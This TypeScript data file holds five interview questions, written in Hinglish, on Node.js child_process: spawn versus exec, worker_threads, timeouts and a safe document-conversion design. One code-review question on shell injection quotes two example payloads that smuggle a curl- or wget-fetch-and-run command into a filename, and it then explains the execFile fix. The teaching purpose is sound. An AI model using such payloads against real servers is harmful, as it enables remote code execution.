import type { InterviewQuestion } from "@/lib/types";

const questions: InterviewQuestion[] = [
  {
    id: "cp-1",
    question:
      "spawn, exec, execFile, aur fork — chaaron mein farak batao aur kab kaunsa use karoge.",
    type: "conceptual",
    difficulty: "intermediate",
    shortAnswer:
      "spawn: ek process launch karke uske stdio streams deta hai — long-running / bada / streaming output ke liye. exec: poori command string ek shell ko deta hai aur output buffer karta hai (default 1 MB) — shell features milte hain lekin injection risk. execFile: exec jaisa buffered output lekin shell ke bina — user input safe. fork: naya Node process + automatic IPC channel (process.send / on('message')).",
    detailedAnswer:
      "spawn(bin, [args], opts) — sabse low-level. stdout/stderr streams milte hain, output chunk-by-chunk. ffmpeg, git clone, docker build jaise commands jinka output bada/live hota hai aur exit code precisely chahiye. exec(str, cb) — internally /bin/sh -c str, saara output memory mein (maxBuffer default 1 MB, cross hua to process kill). Shell pipelines/globbing/&& chahiye ho aur command fully hard-coded ho tabhi. execFile(bin, [args], cb) — shell nahi, args ek array, output buffered. Chhote bounded output ke liye sabse safe quick option; user input plain argument rehta hai. fork(modulePath) — spawn ka special case, child ek Node script, ek IPC descriptor auto set. Parent-child structured messaging (process.send). Decision: external command -> spawn (default) ya execFile (chhota output). Shell pipeline hard-coded -> exec. Node-to-Node ongoing messaging -> fork. CPU-bound apna JS -> worker_threads, child_process nahi.",
    followUp: "exec ka maxBuffer default kya hai aur cross karne par kya hota hai?",
    redFlag:
      "\"spawn aur exec basically same hain\" — exec shell spawn karta hai aur output buffer karta hai; ye do bade practical (aur security) farak hain.",
  },
  {
    id: "cp-2",
    question:
      "Ye code review karo: `exec('convert ' + req.query.file + ' /tmp/out.png')`. Kya problem hai aur kaise fix karoge?",
    type: "trap",
    difficulty: "advanced",
    shortAnswer:
      "Shell command injection. exec poori string /bin/sh -c ko deta hai, to `req.query.file = 'x.png; curl evil.sh | sh'` server par arbitrary commands chala dega. Fix: execFile('convert', [userFile, '/tmp/out.png']) — shell bypass, input plain argument. Plus filename validate/allowlist karo aur path traversal check.",
    detailedAnswer:
      "Problem: user-controlled `req.query.file` seedhe shell string mein concat ho raha hai. Shell metacharacters (`;`, `|`, `&&`, `$()`, backticks, `>`) sab active hain. Attacker `file=a.png;wget http://x/sh -O /tmp/s;sh /tmp/s` bhej ke RCE le sakta hai. Fixes: (1) `execFile('convert', [userFile, outPath], { timeout: 10000 })` — shell nahi lagta, `userFile` ek argument rehta hai chahe usme `;` ho. (2) Input validation: filename ko ek strict allowlist regex se check karo (`/^[\\w.-]+$/`), extension whitelist, aur resolve karke ensure karo wo expected upload dir ke andar hai (path traversal). (3) `{ timeout }` + SIGKILL escalation taaki malicious/corrupt input hang na kare. (4) Output disk par likhwao (jaisa yahan already hai) taaki maxBuffer issue na ho. (5) Bonus: process ko low privilege user / container / seccomp ke andar chalao. Rule: user input kabhi exec string mein nahi.",
    followUp: "Agar tumhe genuinely ek shell pipeline chahiye (a | b | c), to safely kaise karoge?",
    redFlag: "\"Bas file name ko quotes mein daal do\" — quoting shell escaping bug-prone hai; sahi fix shell ko hataana hai (execFile/spawn).",
  },
  {
    id: "cp-3",
    question:
      "child_process aur worker_threads mein kya farak hai? Ek scenario do jahan child_process hi sahi choice hai worker_threads nahi.",
    type: "conceptual",
    difficulty: "advanced",
    shortAnswer:
      "worker_threads: ek alag thread, same process, apna V8 isolate — CPU-bound JavaScript ke liye, lighter. child_process: ek poora alag OS process — kisi bhi program/language ke liye, aur full crash/memory isolation deta hai. child_process hi chahiye jab: (a) tum ek external binary chala rahe ho (ffmpeg, python), ya (b) code crash/segfault/OOM kar sakta hai aur parent ko zinda rehna hai (untrusted ya flaky native code).",
    detailedAnswer:
      "Mechanics: worker_threads ek OS thread banata hai same process ke andar — naya V8 isolate (alag heap/globals) lekin same PID, same address space. Communication postMessage (structured clone) / SharedArrayBuffer. Spawn ~10-50 ms. child_process ek naya process (naya PID, alag virtual memory, alag FDs). spawn/exec/execFile koi bhi binary; fork naya Node + IPC. Spawn tens of ms (fork 50-150 ms), IPC cross-process to slower. Isolation: worker crash ke case mein native-code segfault poore process ko le jaata hai (same process). child_process mein child ka segfault/OOM sirf child ko maarta hai, parent handle kar leta hai (exit code/signal). Scenario for child_process: user-submitted code ko sandbox mein evaluate karna — ek worker thread same process mein hai to malicious/buggy native call parent ko bhi gira sakta hai; ek child process (plus OS sandbox: seccomp, cgroups, non-root, read-only FS) proper isolation deta hai, aur timeout par bas kill kar do. Dusra: ffmpeg/libreoffice/python — wo JavaScript hai hi nahi.",
    followUp: "cluster module in dono mein se kis par bana hai, aur wo kya alag karta hai?",
  },
  {
    id: "cp-4",
    question:
      "spawn se ek long-running command chalate waqt kaunse events aur options production mein zaroori hain?",
    type: "scenario",
    difficulty: "intermediate",
    shortAnswer:
      "Events: 'error' (spawn hi fail — binary missing/EACCES), 'close' (code, signal — hamesha code===0 check karo), aur stdout/stderr 'data' handlers. Options: { timeout } (default 0 = kabhi nahi), phir SIGTERM ke baad SIGKILL escalation; stdio config; aur concurrency cap taaki bahut saare children RAM na bhar dein.",
    detailedAnswer:
      "1) 'error' vs 'close': 'error' tab fire hota hai jab process start hi nahi hua (binary nahi mila, permission nahi) — command ke non-zero exit se alag. Dono handle karo. 'close' par (code, signal) milta hai: code null aur signal 'SIGTERM' matlab kill hua; code non-zero matlab command fail. Bina check kiye success maan lena bug hai. 2) Timeout: default koi nahi. { timeout: N } set karo; ya khud setTimeout se child.kill('SIGTERM'), aur agar 5-10s baad bhi zinda hai to child.kill('SIGKILL'). 3) stdio: 'pipe' (default, streams milte hain), 'inherit' (child terminal directly use kare), 'ignore'. Bade output ko file/stream par bhejo, memory mein accumulate mat karo. 4) Backpressure: agar tum stdout dheere consume karte ho, child block ho sakta hai — pipe ya properly drain karo. 5) Concurrency: ek semaphore/queue se max N parallel children, warna 100 ffmpeg = box OOM. 6) Cleanup: parent SIGTERM par apne children ko bhi kill karo (detached/process-group handling) warna zombies.",
    followUp: "Child ko SIGTERM bhejne par wo respond nahi kar raha — kya karoge?",
  },
  {
    id: "cp-5",
    question:
      "Ek microservice user .docx uploads ko PDF banata hai external tool se. Design kaise karoge — reliability aur security dono?",
    type: "scenario",
    difficulty: "advanced",
    shortAnswer:
      "execFile (shell nahi) se libreoffice/unoconv chalao, filename ek argument ke roop mein. Har conversion fresh child + { timeout } + SIGKILL escalation, taaki ek corrupt file hang/crash pure service ko na maare. Concurrency semaphore se cap. Output disk par (stdout par nahi) to maxBuffer issue nahi. Input validate: extension whitelist, size limit, path-traversal check, low-privilege sandbox.",
    detailedAnswer:
      "Flow: upload receive -> validate (MIME + extension whitelist, max size, filename sanitize, resolve inside upload dir) -> ek job. Conversion: `execFile('libreoffice', ['--headless','--convert-to','pdf','--outdir', outDir, inputPath], { timeout: 30000 })`. Shell nahi to injection nahi. Har call ek naya process — isolation: agar LibreOffice ek malformed docx par crash ya infinite-loop kare, timeout SIGTERM bhejta hai, phir SIGKILL, aur main service unaffected. Reliability: (1) concurrency cap (semaphore, e.g. max 4) taaki N parallel LibreOffice box ki RAM na bhare; extra jobs queue. (2) Retry with backoff for transient failures, lekin poison inputs ko dead-letter karo (infinite retry nahi). (3) Exit code + output file existence dono check — silent partial output se bachne ke liye. (4) Temp files ko finally block mein cleanup. Security hardening: process ko non-root user, container with read-only rootfs + tmpfs for /tmp, network egress blocked (LibreOffice ko internet nahi chahiye), seccomp profile. Observability: per-conversion duration, timeout rate, crash rate metrics. Scale: agar volume bada -> ye ek dedicated worker fleet ban jaata hai jo ek queue (SQS/BullMQ) se consume kare, API turant 202 + job id de.",
    followUp: "Agar conversions ka volume 100x badh jaye to architecture kaise badlega?",
  },
];

export default questions;
